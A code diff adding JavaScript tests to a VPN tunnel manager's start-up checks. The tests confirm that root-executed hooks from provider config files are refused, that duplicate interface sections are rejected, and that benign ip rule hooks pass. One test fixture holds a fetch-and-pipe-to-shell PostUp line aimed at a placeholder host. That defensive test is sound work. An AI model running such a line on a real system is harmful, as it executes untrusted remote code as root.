@@ -601,4 +601,66 @@ describe('the start-up fuse (NEW)', () => {
     assert.equal(stopped.ok, true);
     assert.equal(stopped.refused, false);
   });
+
+  test('a provider hook refuses the start, and the refusal quotes the command', async () => {
+    // The third scenario of §2.3: `awg-quick` would run this line through bash as
+    // root, so a file from a provider is a script we must not execute.
+    const line = 'PostUp = curl -s http://example.invalid/install.sh | sh';
+    const dir = makeTempDir();
+    const amneziaDir = path.join(dir, 'amnezia');
+    fs.mkdirSync(amneziaDir, {recursive: true});
+    fs.writeFileSync(
+      path.join(amneziaDir, 'de.conf'),
+      ['[Interface]', 'Table = off', line, 'PrivateKey = x'].join('\n'),
+    );
+
+    const log = path.join(dir, 'argv.log');
+    const env = fakeSystemEnv({
+      GATEHOUSE_AMNEZIA_DIR: amneziaDir,
+      FAKE_SYSTEMCTL_ARGV_LOG: log,
+    });
+
+    const started = await enableTunnel('de', {env});
+    assert.equal(started.refused, true);
+    assert.deepEqual(started.command, [], 'systemctl is not even assembled');
+    assert.match(started.error, /от root/);
+    assert.ok(started.error.includes(line), 'the owner sees exactly what was stopped');
+    assert.equal(fs.existsSync(log), false, 'no systemctl process was ever spawned');
+  });
+
+  test('two [Interface] sections are refused: a hand-placed file is no way through', async () => {
+    const dir = makeTempDir();
+    const amneziaDir = path.join(dir, 'amnezia');
+    fs.mkdirSync(amneziaDir, {recursive: true});
+    fs.writeFileSync(
+      path.join(amneziaDir, 'de.conf'),
+      ['[Interface]', 'Table = off', '[Interface]', 'Table = auto', 'PrivateKey = x'].join('\n'),
+    );
+
+    const env = fakeSystemEnv({GATEHOUSE_AMNEZIA_DIR: amneziaDir});
+    const started = await restartTunnel('de', {env});
+    assert.equal(started.refused, true);
+    assert.deepEqual(started.command, []);
+    assert.match(started.error, /больше одной секции/);
+  });
+
+  test('the ip rule pair written for policy routing is allowed through', async () => {
+    const dir = makeTempDir();
+    const amneziaDir = path.join(dir, 'amnezia');
+    applyTunnelConfig(
+      [
+        '[Interface]',
+        'Table = off',
+        'PostUp = ip rule add from 100.64.0.2 table 200',
+        'PreDown = ip rule del from 100.64.0.2 table 200',
+        'PrivateKey = x',
+      ].join('\n'),
+      {name: 'de', amneziaDir},
+    );
+
+    const env = fakeSystemEnv({GATEHOUSE_AMNEZIA_DIR: amneziaDir});
+    const started = await restartTunnel('de', {env});
+    assert.equal(started.refused, false);
+    assert.equal(started.ok, true);
+  });
 });
